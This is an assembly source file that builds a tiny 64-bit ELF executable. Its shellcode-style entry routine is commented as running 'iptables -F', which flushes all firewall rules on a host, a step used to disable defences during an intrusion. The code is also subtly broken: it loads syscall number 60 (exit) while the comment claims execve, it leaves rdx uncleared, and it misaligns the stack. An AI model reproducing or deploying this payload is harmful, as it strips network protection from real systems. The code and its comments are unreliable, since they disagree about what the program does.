bits 64
            org 0x08048000

ehdr:                                           ; Elf64_Ehdr
            db  0x7F, "ELF", 2, 1, 1, 0         ;   e_ident
    times 8 db  0
            dw  2                               ;   e_type
            dw  62                              ;   e_machine
            dd  1                               ;   e_version
            dq  _start                          ;   e_entry
            dq  phdr - $$                       ;   e_phoff
            dq  0                               ;   e_shoff
            dd  0                               ;   e_flags
            dw  ehdrsize                        ;   e_ehsize
            dw  phdrsize                        ;   e_phentsize
            dw  1                               ;   e_phnum
            dw  0                               ;   e_shentsize
            dw  0                               ;   e_shnum
            dw  0                               ;   e_shstrndx

ehdrsize    equ $ - ehdr

phdr:                                           ; Elf64_Phdr
            dd  1                               ;   p_type
            dd  5                               ;   p_flags
            dq  0                               ;   p_offset
            dq  $$                              ;   p_vaddr
            dq  $$                              ;   p_paddr
            dq  filesize                        ;   p_filesz
            dq  filesize                        ;   p_memsz
            dq  0x1000                          ;   p_align

phdrsize    equ     $ - phdr

_start:
    xor     rax, rax                  ; Clear rax register
    push    rax                       ; Push NULL (end of argv[])
    push    word 0x462d               ; Push "-F" argument
    mov     rcx, rsp                  ; rcx = pointer to "-F"
    
    mov     rbx, 0x73656c626174ffff  ; Load "/sbin/iptables" (part 1, reversed)
    shr     rbx, 0x10                 ; Remove padding
    push    rbx                       ; Push "/sbin/iptables" (part 1)
    mov     rbx, 0x70692f6e6962732f  ; Load "/sbin/ip" (part 2, reversed)
    push    rbx                       ; Push "/sbin/iptables" (part 2)
    mov     rdi, rsp                  ; rdi = pointer to "/sbin/iptables"
    
    push    rax                       ; Push NULL (for argv[])
    push    rcx                       ; Push pointer to "-F"
    push    rdi                       ; Push pointer to "/sbin/iptables"
    mov     rsi, rsp                  ; rsi = pointer to argv[]

    ; execve("/sbin/iptables", ["/sbin/iptables", "-F"], NULL);
    mov     al, 60                    ; syscall number for execve
    syscall                           ; Make syscall to execute program


filesize      equ     $ - $$
